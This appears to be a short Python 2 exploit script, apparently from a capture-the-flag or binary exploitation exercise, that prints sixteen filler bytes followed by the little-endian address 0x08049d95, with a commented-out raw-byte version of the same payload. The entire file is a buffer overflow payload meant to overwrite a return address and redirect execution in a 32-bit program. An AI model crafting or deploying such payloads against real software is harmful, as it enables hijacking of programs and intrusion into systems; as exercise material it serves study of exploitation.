import struct

# print 'a'*16 + '\x95\x9d\x04\x08'
print 'a'*16 + struct.pack('<I', 0x08049d95)
